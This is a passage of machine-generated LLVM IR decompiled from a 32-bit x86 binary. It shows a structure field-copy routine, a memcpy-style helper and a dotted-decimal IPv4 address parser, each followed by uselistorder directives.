  %v3_8054972 = inttoptr i32 %v2_8054972 to i32*
  store i32 %v4_805496e, i32* %v3_8054972, align 4
  %v0_8054975 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054975 = add i32 %v0_8054975, 10
  %v2_8054975 = inttoptr i32 %v1_8054975 to i16*
  %v3_8054975 = load i16, i16* %v2_8054975, align 2
  %v4_8054975 = zext i16 %v3_8054975 to i32
  store i32 %v4_8054975, i32* %eax.global-to-local, align 4
  %v1_8054979 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054979 = add i32 %v1_8054979, 20
  %v3_8054979 = inttoptr i32 %v2_8054979 to i32*
  store i32 %v4_8054975, i32* %v3_8054979, align 4
  %v0_805497c = load i32, i32* %esi.global-to-local, align 4
  %v1_805497c = add i32 %v0_805497c, 12
  %v2_805497c = inttoptr i32 %v1_805497c to i16*
  %v3_805497c = load i16, i16* %v2_805497c, align 2
  %v4_805497c = zext i16 %v3_805497c to i32
  store i32 %v4_805497c, i32* %eax.global-to-local, align 4
  %v1_8054980 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054980 = add i32 %v1_8054980, 24
  %v3_8054980 = inttoptr i32 %v2_8054980 to i32*
  store i32 %v4_805497c, i32* %v3_8054980, align 4
  %v0_8054983 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054983 = add i32 %v0_8054983, 14
  %v2_8054983 = inttoptr i32 %v1_8054983 to i16*
  %v3_8054983 = load i16, i16* %v2_8054983, align 2
  %v4_8054983 = zext i16 %v3_8054983 to i32
  store i32 %v4_8054983, i32* %eax.global-to-local, align 4
  %v1_8054987 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054987 = add i32 %v1_8054987, 28
  %v3_8054987 = inttoptr i32 %v2_8054987 to i32*
  store i32 %v4_8054983, i32* %v3_8054987, align 4
  %v0_805498a = load i32, i32* %esi.global-to-local, align 4
  %v1_805498a = add i32 %v0_805498a, 16
  %v2_805498a = inttoptr i32 %v1_805498a to i16*
  %v3_805498a = load i16, i16* %v2_805498a, align 2
  %v4_805498a = zext i16 %v3_805498a to i32
  store i32 %v4_805498a, i32* %eax.global-to-local, align 4
  %v0_805498e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805498e = add i32 %v0_805498e, 36
  %v2_805498e = inttoptr i32 %v1_805498e to i32*
  store i32 0, i32* %v2_805498e, align 4
  %v0_8054995 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054995 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054995 = add i32 %v1_8054995, 32
  %v3_8054995 = inttoptr i32 %v2_8054995 to i32*
  store i32 %v0_8054995, i32* %v3_8054995, align 4
  %v0_8054998 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054998 = add i32 %v0_8054998, 20
  %v2_8054998 = inttoptr i32 %v1_8054998 to i32*
  %v3_8054998 = load i32, i32* %v2_8054998, align 4
  store i32 %v3_8054998, i32* %eax.global-to-local, align 4
  %v1_805499b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805499b = add i32 %v1_805499b, 44
  %v3_805499b = inttoptr i32 %v2_805499b to i32*
  store i32 %v3_8054998, i32* %v3_805499b, align 4
  %v0_805499e = load i32, i32* %esi.global-to-local, align 4
  %v1_805499e = add i32 %v0_805499e, 24
  %v2_805499e = inttoptr i32 %v1_805499e to i32*
  %v3_805499e = load i32, i32* %v2_805499e, align 4
  store i32 %v3_805499e, i32* %eax.global-to-local, align 4
  %v1_80549a1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80549a1 = add i32 %v1_80549a1, 48
  %v3_80549a1 = inttoptr i32 %v2_80549a1 to i32*
  store i32 %v3_805499e, i32* %v3_80549a1, align 4
  %v0_80549a4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80549a4 = add i32 %v0_80549a4, 28
  %v2_80549a4 = inttoptr i32 %v1_80549a4 to i32*
  %v3_80549a4 = load i32, i32* %v2_80549a4, align 4
  store i32 %v3_80549a4, i32* %eax.global-to-local, align 4
  %v1_80549a7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80549a7 = add i32 %v1_80549a7, 52
  %v3_80549a7 = inttoptr i32 %v2_80549a7 to i32*
  store i32 %v3_80549a4, i32* %v3_80549a7, align 4
  %v0_80549aa = load i32, i32* %esi.global-to-local, align 4
  %v1_80549aa = add i32 %v0_80549aa, 32
  %v2_80549aa = inttoptr i32 %v1_80549aa to i32*
  %v3_80549aa = load i32, i32* %v2_80549aa, align 4
  store i32 %v3_80549aa, i32* %eax.global-to-local, align 4
  %v1_80549ad = load i32, i32* %ebx.global-to-local, align 4
  %v2_80549ad = add i32 %v1_80549ad, 56
  %v3_80549ad = inttoptr i32 %v2_80549ad to i32*
  store i32 %v3_80549aa, i32* %v3_80549ad, align 4
  %v0_80549b0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80549b0 = add i32 %v0_80549b0, 40
  %v2_80549b0 = inttoptr i32 %v1_80549b0 to i32*
  %v3_80549b0 = load i32, i32* %v2_80549b0, align 4
  store i32 %v3_80549b0, i32* %eax.global-to-local, align 4
  %v1_80549b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80549b3 = add i32 %v1_80549b3, 64
  %v3_80549b3 = inttoptr i32 %v2_80549b3 to i32*
  store i32 %v3_80549b0, i32* %v3_80549b3, align 4
  %v0_80549b6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80549b6 = add i32 %v0_80549b6, 48
  %v2_80549b6 = inttoptr i32 %v1_80549b6 to i32*
  %v3_80549b6 = load i32, i32* %v2_80549b6, align 4
  store i32 %v3_80549b6, i32* %eax.global-to-local, align 4
  %v1_80549b9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80549b9 = add i32 %v1_80549b9, 72
  %v3_80549b9 = inttoptr i32 %v2_80549b9 to i32*
  store i32 %v3_80549b6, i32* %v3_80549b9, align 4
  %v2_80549bf = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80549bf, i32* @ebx, align 4
  ret i32 %v3_80549b6

; uselistorder directives
  uselistorder i32 72, { 4, 3, 5, 0, 6, 7, 8, 1, 9, 10, 11, 12, 2 }
  uselistorder i32 64, { 11, 10, 6, 5, 0, 1, 7, 2, 12, 13, 4, 8, 3, 9 }
  uselistorder i32 40, { 10, 5, 11, 6, 0, 7, 8, 9, 1, 3, 12, 2, 13, 14, 15, 16, 4 }
  uselistorder i32 56, { 9, 8, 0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 6, 15, 16, 17, 7 }
  uselistorder i32 52, { 6, 5, 8, 9, 2, 3, 0, 7, 4, 1 }
  uselistorder i32 48, { 14, 15, 12, 7, 11, 1, 6, 8, 2, 3, 9, 0, 10, 13, 4, 16, 17, 18, 19, 20, 5 }
  uselistorder i32 32, { 58, 59, 63, 37, 48, 64, 65, 60, 34, 52, 53, 66, 1, 0, 2, 3, 43, 4, 5, 6, 7, 8, 38, 67, 39, 44, 45, 49, 46, 47, 35, 10, 9, 12, 11, 13, 14, 41, 40, 50, 51, 54, 55, 15, 56, 17, 16, 42, 57, 61, 36, 62, 68, 18, 19, 20, 21, 69, 22, 23, 70, 71, 25, 24, 27, 26, 28, 29, 72, 30, 31, 73, 74, 75, 32, 33, 76 }
  uselistorder i32 36, { 5, 4, 0, 2, 6, 7, 1, 8, 9, 10, 11, 3 }
  uselistorder i32 14, { 5, 1, 3, 0, 2, 10, 11, 6, 7, 8, 9, 4 }
  uselistorder i32 24, { 46, 47, 18, 44, 45, 54, 48, 49, 50, 7, 8, 0, 1, 14, 35, 31, 9, 12, 19, 13, 20, 21, 10, 37, 32, 22, 11, 23, 36, 24, 25, 26, 27, 28, 29, 30, 33, 34, 38, 39, 40, 43, 42, 41, 15, 2, 51, 52, 53, 5, 16, 4, 3, 55, 17, 6 }
  uselistorder i32 20, { 28, 29, 10, 18, 26, 27, 41, 30, 31, 32, 33, 0, 1, 17, 12, 15, 16, 13, 19, 14, 20, 21, 22, 23, 24, 25, 2, 3, 34, 35, 36, 4, 5, 37, 38, 39, 42, 40, 9, 7, 8, 6, 43, 44, 45, 11 }
  uselistorder i32 16, { 80, 81, 82, 83, 84, 85, 86, 87, 20, 52, 3, 88, 33, 116, 4, 67, 68, 69, 0, 5, 117, 118, 7, 6, 119, 1, 8, 89, 90, 21, 34, 51, 27, 35, 28, 36, 11, 12, 44, 53, 54, 10, 60, 39, 42, 43, 40, 56, 41, 45, 55, 46, 13, 38, 37, 57, 58, 59, 61, 62, 63, 47, 64, 29, 65, 22, 70, 71, 72, 73, 74, 75, 76, 77, 78, 30, 14, 79, 23, 24, 31, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 49, 106, 25, 26, 107, 108, 109, 110, 111, 9, 32, 66, 112, 113, 114, 120, 115, 121, 125, 16, 126, 127, 128, 129, 130, 131, 132, 122, 123, 124, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 2, 143, 144, 145, 146, 147, 148, 149, 150, 19, 151, 17, 18, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 15, 174, 50, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 48 }
  uselistorder i32 8, { 115, 116, 117, 118, 119, 120, 121, 122, 123, 54, 129, 55, 130, 56, 94, 11, 132, 133, 134, 135, 136, 137, 138, 4, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 5, 103, 104, 105, 106, 107, 108, 109, 110, 149, 150, 151, 152, 153, 154, 63, 6, 64, 7, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 62, 172, 173, 8, 174, 175, 176, 177, 9, 178, 124, 125, 126, 127, 131, 58, 65, 59, 66, 60, 67, 179, 180, 181, 68, 98, 97, 12, 95, 99, 100, 101, 13, 102, 111, 112, 113, 114, 14, 15, 16, 17, 18, 10, 69, 0, 19, 20, 128, 70, 71, 21, 72, 73, 22, 23, 74, 24, 1, 2, 182, 51, 183, 29, 30, 28, 35, 184, 27, 33, 34, 75, 61, 76, 77, 31, 78, 32, 79, 3, 25, 52, 185, 36, 80, 37, 81, 38, 39, 40, 41, 82, 42, 43, 44, 83, 45, 84, 186, 85, 46, 86, 47, 87, 187, 88, 48, 89, 49, 90, 91, 92, 50, 26, 188, 53, 189, 93, 96, 57 }
  uselistorder i32 (i8*, i32, i32)* @function_80527ca, { 7, 4, 5, 6, 0, 1, 2, 3, 8 }
  uselistorder i32 88, { 0, 2, 1, 3 }
}

define i32 @function_80549c2(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80549c2:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80549c3 = load i32, i32* @esi, align 4
  store i32 %v0_80549c3, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_80549c4 = sdiv i32 %sext, 16777216
  store i32 %v4_80549c4, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80549ce = ptrtoint i16* %arg1 to i32
  store i32 %v4_80549ce, i32* %edi.global-to-local, align 4
  %v2_80549d2 = udiv i32 %v4_80549c4, 4
  %v3_80549d5 = inttoptr i32 %arg2 to i8*
  %v4_80549d5 = bitcast i16* %arg1 to i8*
  %v5_80549d5 = call i8* @_memcpy(i8* %v4_80549d5, i8* %v3_80549d5, i32 %v2_80549d2)
  %v0_80549d7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80549d7 = and i32 %v0_80549d7, 2
  %v3_80549d7 = icmp eq i32 %v2_80549d7, 0
  br i1 %v3_80549d7, label %dec_label_pc_80549dd, label %dec_label_pc_80549db

dec_label_pc_80549db:                             ; preds = %dec_label_pc_80549c2
  %v0_80549db = load i32, i32* %esi.global-to-local, align 4
  %v1_80549db = inttoptr i32 %v0_80549db to i16*
  %v2_80549db = load i16, i16* %v1_80549db, align 2
  %v3_80549db = load i32, i32* %edi.global-to-local, align 4
  %v4_80549db = inttoptr i32 %v3_80549db to i16*
  store i16 %v2_80549db, i16* %v4_80549db, align 2
  %v5_80549db = load i32, i32* %edi.global-to-local, align 4
  %v6_80549db = load i32, i32* %esi.global-to-local, align 4
  %v7_80549db = load i1, i1* @df, align 1
  %v8_80549db = select i1 %v7_80549db, i32 -2, i32 2
  %v9_80549db = add i32 %v8_80549db, %v5_80549db
  %v10_80549db = add i32 %v8_80549db, %v6_80549db
  store i32 %v9_80549db, i32* %edi.global-to-local, align 4
  store i32 %v10_80549db, i32* %esi.global-to-local, align 4
  %v0_80549dd.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80549dd

dec_label_pc_80549dd:                             ; preds = %dec_label_pc_80549c2, %dec_label_pc_80549db
  %v0_80549dd = phi i32 [ %v0_80549d7, %dec_label_pc_80549c2 ], [ %v0_80549dd.pre, %dec_label_pc_80549db ]
  %v2_80549dd = urem i32 %v0_80549dd, 2
  %v3_80549dd = icmp eq i32 %v2_80549dd, 0
  br i1 %v3_80549dd, label %dec_label_pc_80549e2, label %dec_label_pc_80549e1

dec_label_pc_80549e1:                             ; preds = %dec_label_pc_80549dd
  %v0_80549e1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80549e1 = inttoptr i32 %v0_80549e1 to i8*
  %v2_80549e1 = load i8, i8* %v1_80549e1, align 1
  %v3_80549e1 = load i32, i32* %edi.global-to-local, align 4
  %v4_80549e1 = inttoptr i32 %v3_80549e1 to i8*
  store i8 %v2_80549e1, i8* %v4_80549e1, align 1
  %v5_80549e1 = load i32, i32* %edi.global-to-local, align 4
  %v6_80549e1 = load i32, i32* %esi.global-to-local, align 4
  %v7_80549e1 = load i1, i1* @df, align 1
  %v8_80549e1 = select i1 %v7_80549e1, i32 -1, i32 1
  %v9_80549e1 = add i32 %v8_80549e1, %v5_80549e1
  %v10_80549e1 = add i32 %v8_80549e1, %v6_80549e1
  store i32 %v9_80549e1, i32* %edi.global-to-local, align 4
  store i32 %v10_80549e1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80549e2

dec_label_pc_80549e2:                             ; preds = %dec_label_pc_80549dd, %dec_label_pc_80549e1
  store i32 %v4_80549ce, i32* %eax.global-to-local, align 4
  %v2_80549e6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80549e6, i32* @esi, align 4
  ret i32 %v4_80549ce

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -2, { 19, 18, 20, 17, 21, 0, 1, 4, 7, 8, 5, 3, 2, 6, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i1* @df, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 4, { 2, 180, 181, 182, 183, 184, 185, 235, 236, 238, 239, 240, 241, 242, 237, 56, 94, 243, 245, 246, 248, 251, 252, 253, 254, 255, 256, 3, 257, 258, 259, 260, 261, 262, 263, 264, 249, 250, 159, 59, 160, 161, 162, 163, 164, 165, 166, 4, 168, 167, 265, 5, 266, 58, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 9, 287, 288, 290, 289, 6, 247, 244, 98, 63, 186, 187, 188, 189, 190, 60, 64, 291, 292, 65, 105, 106, 66, 107, 108, 109, 132, 133, 134, 137, 138, 139, 140, 141, 142, 129, 130, 110, 111, 143, 144, 145, 119, 120, 121, 99, 100, 101, 116, 117, 118, 122, 123, 124, 125, 126, 127, 146, 147, 102, 103, 104, 112, 113, 114, 115, 13, 128, 131, 95, 148, 156, 157, 158, 149, 135, 136, 61, 155, 14, 150, 62, 151, 152, 153, 154, 169, 170, 171, 96, 172, 173, 15, 174, 175, 176, 16, 17, 18, 19, 177, 67, 68, 178, 179, 69, 57, 191, 0, 192, 193, 194, 195, 196, 197, 20, 21, 198, 70, 199, 71, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 22, 72, 73, 212, 213, 214, 215, 216, 217, 218, 23, 219, 220, 221, 222, 24, 74, 223, 224, 225, 226, 25, 293, 294, 227, 228, 229, 230, 231, 232, 233, 234, 8, 295, 296, 297, 52, 30, 31, 29, 36, 28, 34, 35, 298, 299, 300, 10, 75, 76, 77, 32, 78, 33, 79, 1, 301, 26, 302, 53, 11, 303, 37, 80, 38, 81, 39, 304, 40, 41, 42, 82, 43, 44, 45, 83, 46, 84, 85, 47, 86, 48, 87, 305, 88, 49, 89, 50, 90, 306, 91, 92, 307, 51, 308, 309, 310, 311, 313, 312, 314, 315, 316, 317, 318, 319, 320, 321, 322, 27, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 54, 12, 7, 350, 55, 93, 351, 97 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* @esi, { 121, 122, 38, 39, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 2, 78, 79, 123, 124, 13, 125, 126, 127, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 128, 129, 130, 144, 148, 3, 149, 150, 151, 152, 153, 154, 155, 145, 146, 147, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 156, 157, 158, 159, 160, 161, 162, 0, 163, 164, 165, 166, 4, 167, 10, 168, 169, 170, 171, 172, 173, 80, 81, 5, 82, 83, 84, 85, 86, 87, 88, 89, 142, 143, 174, 175, 14, 17, 18, 19, 29, 30, 25, 31, 23, 15, 22, 24, 32, 26, 16, 20, 21, 27, 28, 33, 34, 35, 36, 37, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 111, 110, 1, 112, 113, 114, 115, 11, 116, 176, 177, 178, 117, 118, 119, 9, 179, 180, 120, 181, 182, 6, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 7, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 12, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 8, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 283, 280, 281, 282, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304 }
  uselistorder label %dec_label_pc_80549e2, { 1, 0 }
  uselistorder label %dec_label_pc_80549dd, { 1, 0 }
}

define i32 @function_80549e9(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80549e9:
  %v1_80549f4 = icmp eq i8* %arg1, null
  br i1 %v1_80549f4, label %dec_label_pc_8054a75, label %dec_label_pc_80549f8

dec_label_pc_80549f8:                             ; preds = %dec_label_pc_80549e9
  %v4_80549f0 = ptrtoint i8* %arg1 to i32
  %v0_8054a06.pre = load i32, i32* bitcast (i32** @global_var_80568cc.229 to i32*), align 4
  br label %dec_label_pc_8054a03

dec_label_pc_8054a03:                             ; preds = %dec_label_pc_80549f8, %dec_label_pc_8054a4c
  %v0_8054a4c = phi i32 [ 0, %dec_label_pc_80549f8 ], [ %v2_8054a52, %dec_label_pc_8054a4c ]
  %v2_8054a4f = phi i32 [ 1, %dec_label_pc_80549f8 ], [ %v3_8054a4f, %dec_label_pc_8054a4c ]
  %v0_8054a03 = phi i32 [ %v4_80549f0, %dec_label_pc_80549f8 ], [ %v0_8054a033, %dec_label_pc_8054a4c ]
  %v1_8054a03 = inttoptr i32 %v0_8054a03 to i8*
  %v2_8054a03 = load i8, i8* %v1_8054a03, align 1
  %v3_8054a03 = sext i8 %v2_8054a03 to i32
  %v2_8054a0c = mul nsw i32 %v3_8054a03, 2
  %v3_8054a0c = add i32 %v2_8054a0c, %v0_8054a06.pre
  %v4_8054a0c = inttoptr i32 %v3_8054a0c to i8*
  %v5_8054a0c = load i8, i8* %v4_8054a0c, align 1
  %v6_8054a0c = and i8 %v5_8054a0c, 8
  %v7_8054a0c = icmp eq i8 %v6_8054a0c, 0
  br i1 %v7_8054a0c, label %dec_label_pc_8054a75, label %dec_label_pc_8054a13

dec_label_pc_8054a13:                             ; preds = %dec_label_pc_8054a03
  %v4_8054a27.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054a27

dec_label_pc_8054a17:                             ; preds = %dec_label_pc_8054a27
  %v3_8054a17 = mul i32 %v1_8054a17, 10
  %v2_8054a1a = add i32 %v3_8054a17, -48
  %v3_8054a1a = add i32 %v2_8054a1a, %v2_8054a29
  %v1_8054a1e = add i32 %v3_8054a1a, -255
  %v6_8054a1e = sub i32 254, %v3_8054a1a
  %v7_8054a1e = and i32 %v6_8054a1e, %v3_8054a1a
  %v8_8054a1e = icmp slt i32 %v7_8054a1e, 0
  %v9_8054a1e = icmp eq i32 %v1_8054a1e, 0
  %v10_8054a1e = icmp slt i32 %v1_8054a1e, 0
  %v3_8054a24 = icmp eq i1 %v10_8054a1e, %v8_8054a1e
  %v4_8054a24 = icmp eq i1 %v9_8054a1e, false
  %v5_8054a24 = and i1 %v4_8054a24, %v3_8054a24
  br i1 %v5_8054a24, label %dec_label_pc_8054a75, label %dec_label_pc_8054a26

dec_label_pc_8054a26:                             ; preds = %dec_label_pc_8054a17
  %v1_8054a26 = add i32 %v0_8054a26, 1
  br label %dec_label_pc_8054a27

dec_label_pc_8054a27:                             ; preds = %dec_label_pc_8054a13, %dec_label_pc_8054a26
  %v1_8054a17 = phi i32 [ 0, %dec_label_pc_8054a13 ], [ %v3_8054a1a, %dec_label_pc_8054a26 ]
  %v4_8054a27 = phi i32 [ %v4_8054a27.pre, %dec_label_pc_8054a13 ], [ %v6_8054a27, %dec_label_pc_8054a26 ]
  %v0_8054a26 = phi i32 [ %v0_8054a03, %dec_label_pc_8054a13 ], [ %v1_8054a26, %dec_label_pc_8054a26 ]
  %v1_8054a27 = inttoptr i32 %v0_8054a26 to i8*
  %v2_8054a27 = load i8, i8* %v1_8054a27, align 1
  %v3_8054a27 = zext i8 %v2_8054a27 to i32
  %v5_8054a27 = and i32 %v4_8054a27, -256
  %v6_8054a27 = or i32 %v3_8054a27, %v5_8054a27
  store i32 %v6_8054a27, i32* @edx, align 4
  %v2_8054a29 = sext i8 %v2_8054a27 to i32
  %v2_8054a2c = mul nsw i32 %v2_8054a29, 2
  %v3_8054a2c = add i32 %v2_8054a2c, %v0_8054a06.pre
  %v4_8054a2c = inttoptr i32 %v3_8054a2c to i16*
  %v5_8054a2c = load i16, i16* %v4_8054a2c, align 2
  %v2_8054a31 = and i16 %v5_8054a2c, 8
  %v3_8054a31 = icmp eq i16 %v2_8054a31, 0
  %v1_8054a33 = icmp eq i1 %v3_8054a31, false
  br i1 %v1_8054a33, label %dec_label_pc_8054a17, label %dec_label_pc_8054a35

dec_label_pc_8054a35:                             ; preds = %dec_label_pc_8054a27
  %v8_8054a35 = sub nsw i32 2, %v2_8054a4f
  %v9_8054a35 = and i32 %v8_8054a35, %v2_8054a4f
  %v10_8054a35 = icmp slt i32 %v9_8054a35, 0
  %v11_8054a35 = icmp eq i32 %v2_8054a4f, 3
  %v12_8054a35 = icmp slt i32 %v2_8054a4f, 3
  %v3_8054a39 = icmp eq i1 %v12_8054a35, %v10_8054a35
  %v4_8054a39 = icmp eq i1 %v11_8054a35, false
  %v5_8054a39 = and i1 %v4_8054a39, %v3_8054a39
  br i1 %v5_8054a39, label %dec_label_pc_8054a43, label %dec_label_pc_8054a3b

dec_label_pc_8054a3b:                             ; preds = %dec_label_pc_8054a35
  %v10_8054a3b = icmp eq i8 %v2_8054a27, 46
  %v1_8054a3e = icmp eq i1 %v10_8054a3b, false
  br i1 %v1_8054a3e, label %dec_label_pc_8054a75, label %dec_label_pc_8054a40

dec_label_pc_8054a40:                             ; preds = %dec_label_pc_8054a3b
  %v1_8054a40 = add i32 %v0_8054a26, 1
  br label %dec_label_pc_8054a4c

dec_label_pc_8054a43:                             ; preds = %dec_label_pc_8054a35
  %v1_8054a43 = add i32 %v0_8054a26, 1
  %v4_8054a44 = icmp eq i8 %v2_8054a27, 0
  br i1 %v4_8054a44, label %dec_label_pc_8054a4c, label %dec_label_pc_8054a48

dec_label_pc_8054a48:                             ; preds = %dec_label_pc_8054a43
  %v2_8054a48 = and i16 %v5_8054a2c, 32
  %v3_8054a48 = icmp eq i16 %v2_8054a48, 0
  br i1 %v3_8054a48, label %dec_label_pc_8054a75, label %dec_label_pc_8054a4c

dec_label_pc_8054a4c:                             ; preds = %dec_label_pc_8054a48, %dec_label_pc_8054a43, %dec_label_pc_8054a40
  %v0_8054a033 = phi i32 [ %v1_8054a43, %dec_label_pc_8054a48 ], [ %v1_8054a43, %dec_label_pc_8054a43 ], [ %v1_8054a40, %dec_label_pc_8054a40 ]
  %v2_8054a4c = mul i32 %v0_8054a4c, 256
  %v3_8054a4f = add nuw nsw i32 %v2_8054a4f, 1
  %v2_8054a52 = or i32 %v1_8054a17, %v2_8054a4c
  %v7_8054a58 = icmp sgt i32 %v2_8054a4f, 3
  br i1 %v7_8054a58, label %dec_label_pc_8054a5a, label %dec_label_pc_8054a03

dec_label_pc_8054a5a:                             ; preds = %dec_label_pc_8054a4c
  %v4_8054a5f = icmp eq i32 %arg2, 0
  br i1 %v4_8054a5f, label %dec_label_pc_8054a77, label %dec_label_pc_8054a66

dec_label_pc_8054a66:                             ; preds = %dec_label_pc_8054a5a
  %v1_8054a6a = call i32 @llvm.bswap.i32(i32 %v2_8054a52)
  %v2_8054a6c = inttoptr i32 %arg2 to i32*
  store i32 %v1_8054a6a, i32* %v2_8054a6c, align 4
  br label %dec_label_pc_8054a77

dec_label_pc_8054a75:                             ; preds = %dec_label_pc_8054a48, %dec_label_pc_8054a3b, %dec_label_pc_8054a03, %dec_label_pc_8054a17, %dec_label_pc_80549e9
  br label %dec_label_pc_8054a77

dec_label_pc_8054a77:                             ; preds = %dec_label_pc_8054a5a, %dec_label_pc_8054a66, %dec_label_pc_8054a75
  %v0_8054a7c = phi i32 [ 1, %dec_label_pc_8054a5a ], [ 1, %dec_label_pc_8054a66 ], [ 0, %dec_label_pc_8054a75 ]
  ret i32 %v0_8054a7c

; uselistorder directives
  uselistorder i32 %v2_8054a29, { 1, 0 }
  uselistorder i32 %v6_8054a27, { 1, 0 }
  uselistorder i8 %v2_8054a27, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8054a26, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8054a1e, { 1, 0 }
  uselistorder i32 %v3_8054a1a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8054a4f, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 256, { 1, 23, 27, 24, 2, 3, 4, 5, 0, 6, 7, 28, 21, 8, 9, 11, 10, 22, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 26 }
  uselistorder i32 3, { 1, 2, 0, 29, 15, 32, 6, 7, 11, 3, 8, 12, 4, 20, 21, 22, 23, 24, 25, 26, 16, 9, 27, 28, 13, 14, 10, 30, 31, 5, 33, 18, 19, 34, 17 }
  uselistorder i16 0, { 0, 1, 7, 8, 4, 5, 6, 2, 3 }
  uselistorder i32 -256, { 4, 38, 39, 40, 41, 42, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 8, 9, 23, 10, 13, 15, 24, 17, 18, 19, 5, 6, 7, 11, 12, 14, 16, 20, 21, 22, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 2, 3, 36, 37, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 68, 69, 70, 71, 0, 72, 73, 74, 1, 75, 76, 77, 78, 79 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 10, { 1, 18, 19, 13, 20, 2, 25, 8, 0, 3, 9, 4, 10, 5, 11, 16, 15, 14, 12, 17, 21, 22, 23, 6, 24, 7, 26, 27, 28 }
  uselistorder i32* @edx, { 23, 3, 68, 69, 70, 32, 18, 0, 20, 21, 55, 56, 57, 58, 19, 71, 72, 73, 74, 77, 76, 78, 86, 87, 4, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 5, 101, 102, 84, 85, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 6, 49, 50, 51, 103, 148, 149, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 7, 141, 142, 143, 144, 145, 146, 147, 83, 22, 80, 59, 60, 150, 82, 61, 75, 79, 62, 81, 151, 152, 1, 153, 154, 155, 8, 156, 157, 158, 159, 160, 161, 162, 9, 163, 15, 24, 25, 26, 27, 13, 14, 11, 10, 28, 16, 29, 12, 31, 30, 52, 53, 54, 17, 63, 64, 65, 66, 67, 2, 164, 165, 166, 167, 168, 169, 170 }
